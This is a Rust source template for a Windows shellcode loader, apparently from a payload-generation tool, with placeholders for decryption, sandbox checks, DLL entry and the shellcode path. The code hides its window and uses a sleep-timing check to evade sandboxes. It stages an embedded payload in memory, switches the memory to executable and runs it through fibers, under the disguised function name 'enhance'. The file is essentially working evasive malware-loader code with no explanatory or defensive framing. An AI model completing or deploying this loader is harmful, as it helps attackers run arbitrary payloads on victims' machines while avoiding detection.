#![windows_subsystem = "windows"]
#![allow(non_snake_case)]

use std::ptr::{null, null_mut};

use windows_sys::Win32::{System::{Memory::{VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE}, Threading::{
    ConvertThreadToFiber, CreateFiber, SwitchToFiber, LPFIBER_START_ROUTINE
}}};

use std::include_bytes;

use std::time::{Duration, Instant};
use std::thread;

{{IMPORTS}}

{{SANDBOX_IMPORTS}}

{{DECRYPTION_FUNCTION}}

fn pause(ms: u64) {
    thread::sleep(Duration::from_millis(ms));
}

fn check_environment() -> bool {
    let start = Instant::now();
    pause(3000);
    start.elapsed().as_millis() >= 2500
}

fn wipe(buf: &mut Vec<u8>) {
    for b in buf.iter_mut() {
        unsafe { std::ptr::write_volatile(b as *mut u8, 0); }
    }
    buf.clear();
}

fn enhance(mut buf: Vec<u8>) {
    unsafe {
        let alloc = VirtualAlloc(null(), buf.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if alloc.is_null() { return; }

        pause(150);

        let buf_len = buf.len();
        let alloc_ptr: *mut u8 = alloc as *mut u8;
        std::ptr::copy_nonoverlapping(buf.as_ptr(), alloc_ptr, buf_len);

        wipe(&mut buf);
        pause(200);

        let mut old_perms: PAGE_PROTECTION_FLAGS = PAGE_READWRITE;
        VirtualProtect(alloc, buf_len, PAGE_EXECUTE_READ, &mut old_perms);

        pause(100);

        let buf_ptr: LPFIBER_START_ROUTINE = std::mem::transmute(alloc_ptr);
        let buf_fiber_address = CreateFiber(0, buf_ptr, null_mut());
        if buf_fiber_address.is_null() { return; }

        let primary_fiber_address = ConvertThreadToFiber(null_mut());
        if primary_fiber_address.is_null() { return; }

        SwitchToFiber(buf_fiber_address);
    }
}

fn main() {
    {{SANDBOX}}

    if !check_environment() { return; }

    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let mut vec: Vec<u8> = buf.to_vec();

    {{MAIN}}

    enhance(vec);
}

{{DLL_MAIN}}